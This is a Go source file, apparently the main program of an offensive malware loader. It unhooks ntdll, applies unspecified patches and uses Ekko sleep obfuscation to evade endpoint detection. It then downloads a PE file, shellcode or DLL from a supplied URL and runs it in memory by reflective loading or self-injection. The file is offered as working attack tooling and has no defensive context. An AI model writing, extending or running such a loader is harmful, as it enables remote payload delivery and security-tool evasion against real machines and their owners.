package main  

import (
	"flag"
	"fmt"
	"log"
	"loader/pkg/pe"
	"loader/pkg/dll"
	"github.com/carved4/go-native-syscall"
	"loader/pkg/net"
	"loader/pkg/wrappers"
	"loader/pkg/ekko"
)

func main() {
	winapi.UnhookNtdll()
	winapi.ApplyAllPatches()

	ekko.EkkoSleep(100)

	var (
		uPE       = flag.Bool("pe", false, "Load and execute PE file")
		uSh = flag.Bool("shellcode", false, "Execute shellcode")
		uDL      = flag.Bool("dll", false, "Load and execute DLL")
		url         = flag.String("url", "", "URL to download the file from")
		fn    = flag.String("func", "", "Function name for DLL execution")
	)
	
	flag.Parse()
	
	flagCount := 0
	if *uPE { flagCount++ }
	if *uSh { flagCount++ }
	if *uDL { flagCount++ }
	
	if flagCount == 0 {
		fmt.Println("Usage: program [-pe|-shellcode|-dll] -url <URL> [-func <function_name>]")
		fmt.Println("  -pe:        Load and execute PE file")
		fmt.Println("  -shellcode: Execute shellcode")
		fmt.Println("  -dll:       Load and execute DLL")
		fmt.Println("  -url:       URL to download the file from")
		fmt.Println("  -func:      Function name for DLL execution")
		return
	}
	
	if flagCount > 1 {
		log.Fatalln("[ERROR] Only one execution type can be specified")
	}

	if *url == "" {
		log.Fatalln("[ERROR] URL must be specified")
	}
	
	fileBytes, err := net.DownloadFile(*url)
	if err != nil {
		log.Fatalf("[ERROR] Failed to download file: %v\n", err)
	}
	
	if *uPE {
		ekko.EkkoSleep(100)
		err := pe.LoadPEFromBytes(fileBytes)
		if err != nil {
			log.Fatalf("[ERROR] Failed to load PE: %v\n", err)
		}
		
	} else if *uSh {
		ekko.EkkoSleep(100)
		err := wrappers.NtInjectSelfShellcode(fileBytes)
		if err != nil {
			wrappers.NtInjectSelfShellcode(fileBytes)
		}
	} else if *uDL {
		ekko.EkkoSleep(100)
		err := dll.LoadDLL(fileBytes, *fn)
		if err != nil {
			log.Fatalf("[ERROR] Failed to load DLL: %v\n", err)
		}
	}
}

